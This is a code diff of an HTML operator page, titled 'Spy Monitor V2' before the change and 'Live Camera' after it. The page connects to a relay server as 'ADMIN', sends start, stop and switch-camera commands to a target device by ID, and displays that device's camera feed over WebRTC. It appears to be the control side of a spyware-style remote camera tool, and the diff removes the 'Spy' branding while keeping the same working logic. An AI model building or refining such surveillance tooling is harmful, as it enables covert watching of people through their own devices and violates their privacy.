@@ -1,179 +1,207 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Monitor V2 - Final Stable</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
-    <style>
-        /* CSS vahi rakhi hai jo aapke working code mein thi */
-        body { margin: 0; padding: 0; background-color: #121212; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .phone-frame { position: relative; width: 100%; height: 100%; max-width: 480px; background: #000; display: flex; flex-direction: column; overflow: hidden; border: 2px solid #333; }
-        
-        /* Video Area */
-        .video-container { flex-grow: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; }
-        video { width: 100%; height: 100%; object-fit: contain; background-color: #000; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Camera</title>
 
-        .status-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 5; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #00a8ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 10px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
 
-        /* Top Bar */
-        .top-bar { padding: 10px 20px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
-        .status-badge { background: #ff4444; padding: 5px 12px; border-radius: 15px; font-size: 11px; font-weight: bold; }
-        .status-badge.online { background: #00C851; color: white; }
+<style>
+:root {
+    --bg: #000;
+    --panel: #1c1c1e;
+    --green: #30d158;
+    --red: #ff453a;
+    --blue: #0a84ff;
+}
 
-        /* Controls */
-        .controls { padding: 20px; background: #1a1a1a; display: flex; justify-content: space-around; align-items: center; gap: 10px; }
-        .btn { border: none; border-radius: 30px; font-weight: bold; cursor: pointer; transition: 0.2s; color: white; padding: 12px 20px; }
-        .btn-start { background: #00C851; flex: 2; }
-        .btn-stop { background: #ff4444; flex: 2; }
-        .btn-switch { background: #33b5e5; flex: 1; border-radius: 50%; width: 50px; height: 50px; padding: 0; }
+body {
+    margin: 0;
+    background: var(--bg);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    display: flex;
+    justify-content: center;
+}
 
-        #login-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        input { padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: white; text-align: center; margin-bottom: 15px; width: 70%; }
-    </style>
+.container {
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    background: #000;
+    display: flex;
+    flex-direction: column;
+}
+
+/* HEADER */
+.header {
+    padding: 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.status {
+    font-size: 12px;
+    padding: 5px 12px;
+    border-radius: 20px;
+    background: var(--red);
+    font-weight: 600;
+}
+
+.status.live {
+    background: var(--green);
+    color: #000;
+}
+
+/* VIDEO */
+.video-box {
+    flex: 1;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+video {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+}
+
+/* CONTROLS */
+.controls {
+    padding: 16px;
+    background: var(--panel);
+    display: flex;
+    gap: 12px;
+}
+
+.btn {
+    flex: 1;
+    border: none;
+    border-radius: 14px;
+    padding: 14px 0;
+    font-size: 15px;
+    font-weight: 700;
+    color: white;
+    cursor: pointer;
+}
+
+.start { background: var(--green); color:#000; }
+.stop { background: var(--red); }
+.switch { background: var(--blue); max-width:70px; }
+
+@media (min-width: 700px) {
+    .container {
+        margin-top: 20px;
+        border-radius: 18px;
+        overflow: hidden;
+        border: 1px solid rgba(255,255,255,0.15);
+    }
+}
+</style>
 </head>
+
 <body>
 
-    <div class="phone-frame">
-        <div id="login-overlay">
-            <h2>Spy Monitor</h2>
-            <input type="text" id="targetId" placeholder="Enter Device ID">
-            <button class="btn btn-start" style="width:70%" onclick="saveAndConnect()">CONNECT</button>
-        </div>
+<div class="container">
 
-        <div class="top-bar">
-            <span id="status" class="status-badge">Offline</span>
-            <span id="id-label" style="font-size: 10px; color: #555;">ID: --</span>
-        </div>
-
-        <div class="video-container">
-            <div id="loader" class="status-overlay" style="display: none;">
-                <div class="spinner"></div>
-                <span style="font-size:12px; color:#aaa;">Connecting to Camera...</span>
-            </div>
-            <video id="remoteVideo" autoplay playsinline muted></video>
-        </div>
-
-        <div class="controls">
-            <button class="btn btn-start" onclick="handleStream('start')">▶ START</button>
-            <button class="btn btn-switch" onclick="switchCamera()">🔄</button>
-            <button class="btn btn-stop" onclick="handleStream('stop')">⏹ STOP</button>
-        </div>
+    <div class="header">
+        <span>Live Camera</span>
+        <span id="status" class="status">OFFLINE</span>
     </div>
 
-    <script>
-        const SOCKET_URL = "https://child-v9no.onrender.com"; 
-        let socket, peerConnection, targetDeviceId = "";
-        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+    <div class="video-box">
+        <video id="remoteVideo" autoplay playsinline muted></video>
+    </div>
 
-        window.onload = () => {
-            const savedId = localStorage.getItem("savedDeviceId");
-            if (savedId) document.getElementById("targetId").value = savedId;
-        };
+    <div class="controls">
+        <button class="btn start" onclick="sendCmd('start_video')">▶ START</button>
+        <button class="btn switch" onclick="sendCmd('switch_camera')">🔄</button>
+        <button class="btn stop" onclick="sendCmd('stop_video')">⏹ STOP</button>
+    </div>
 
-        function saveAndConnect() {
-            targetDeviceId = document.getElementById("targetId").value.trim();
-            if (!targetDeviceId) return alert("Enter Device ID!");
-            localStorage.setItem("savedDeviceId", targetDeviceId);
-            document.getElementById("id-label").innerText = "ID: " + targetDeviceId;
-            document.getElementById("login-overlay").style.display = 'none';
-            initSocket();
-        }
+</div>
 
-        function initSocket() {
-            if (socket) socket.disconnect();
-            socket = io(SOCKET_URL);
+<script>
+const SERVER = "https://child-v9no.onrender.com";
+const params = new URLSearchParams(window.location.search);
+const DEVICE_ID = params.get("id");
 
-            socket.on("connect", () => {
-                updateStatus("System Ready", false);
-                socket.emit("join-room", "ADMIN");
+if(!DEVICE_ID){
+    alert("Device ID missing!");
+}
+
+let socket;
+let pc;
+
+const config = {
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+};
+
+socket = io(SERVER);
+
+socket.on("connect", ()=>{
+    socket.emit("join-room","ADMIN");
+});
+
+socket.on("offer", async (data)=>{
+    pc = new RTCPeerConnection(config);
+
+    pc.ontrack = e=>{
+        const v = document.getElementById("remoteVideo");
+        v.srcObject = e.streams[0] || new MediaStream([e.track]);
+        setStatus(true);
+    };
+
+    pc.onicecandidate = e=>{
+        if(e.candidate){
+            socket.emit("candidate",{
+                target: DEVICE_ID,
+                candidate: e.candidate.candidate,
+                sdpMid: e.candidate.sdpMid,
+                sdpMLineIndex: e.candidate.sdpMLineIndex
             });
-
-            socket.on("offer", async (data) => {
-                console.log("📡 Offer Received");
-                document.getElementById("loader").style.display = 'none';
-                createPeerConnection();
-                try {
-                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data));
-                    const answer = await peerConnection.createAnswer();
-                    await peerConnection.setLocalDescription(answer);
-                    socket.emit("answer", { target: targetDeviceId, type: "answer", sdp: answer.sdp });
-                } catch (e) { console.error(e); }
-            });
-
-            socket.on("candidate", async (data) => {
-                if (peerConnection) {
-                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data)); } 
-                    catch (e) { console.error(e); }
-                }
-            });
         }
+    };
 
-        // --- Start/Stop Logic ---
-        function handleStream(action) {
-            if (!socket || !socket.connected) return alert("Socket not connected!");
+    await pc.setRemoteDescription(data);
+    const ans = await pc.createAnswer();
+    await pc.setLocalDescription(ans);
 
-            if (action === 'start') {
-                document.getElementById("loader").style.display = 'block';
-                updateStatus("Starting Camera...", false);
-                socket.emit('send-command', { targetId: targetDeviceId, command: "start_video" });
-            } 
-            else if (action === 'stop') {
-                updateStatus("Stopping...", false);
-                socket.emit('send-command', { targetId: targetDeviceId, command: "stop_video" });
-                
-                // Clean UI & WebRTC
-                const video = document.getElementById("remoteVideo");
-                video.srcObject = null;
-                if (peerConnection) {
-                    peerConnection.close();
-                    peerConnection = null;
-                }
-                document.getElementById("loader").style.display = 'none';
-                updateStatus("Stopped", false);
-            }
-        }
+    socket.emit("answer",{
+        target: DEVICE_ID,
+        sdp: ans.sdp
+    });
+});
 
-        function createPeerConnection() {
-            if (peerConnection) peerConnection.close();
-            peerConnection = new RTCPeerConnection(config);
+socket.on("candidate", async d=>{
+    if(pc){
+        await pc.addIceCandidate(d);
+    }
+});
 
-            // Aapki working track logic
-            peerConnection.ontrack = (event) => {
-                const video = document.getElementById("remoteVideo");
-                if (event.streams && event.streams[0]) {
-                    video.srcObject = event.streams[0];
-                } else {
-                    if (!video.srcObject) video.srcObject = new MediaStream([event.track]);
-                    else video.srcObject.addTrack(event.track);
-                }
-                updateStatus("LIVE", true);
-            };
+function sendCmd(cmd){
+    socket.emit("send-command",{
+        targetId: DEVICE_ID,
+        command: cmd
+    });
 
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    socket.emit("candidate", {
-                        target: targetDeviceId,
-                        type: "candidate",
-                        candidate: event.candidate.candidate,
-                        sdpMid: event.candidate.sdpMid,
-                        sdpMLineIndex: event.candidate.sdpMLineIndex
-                    });
-                }
-            };
-        }
+    if(cmd === "stop_video"){
+        document.getElementById("remoteVideo").srcObject = null;
+        setStatus(false);
+        if(pc){ pc.close(); pc = null; }
+    }
+}
 
-        function switchCamera() {
-            if(socket) socket.emit("switch-camera", { target: targetDeviceId });
-        }
+function setStatus(live){
+    const s = document.getElementById("status");
+    s.textContent = live ? "LIVE" : "OFFLINE";
+    s.className = live ? "status live" : "status";
+}
+</script>
 
-        function updateStatus(text, isOnline) {
-            const el = document.getElementById("status");
-            el.innerText = text;
-            el.className = isOnline ? "status-badge online" : "status-badge";
-        }
-    </script>
 </body>
 </html>
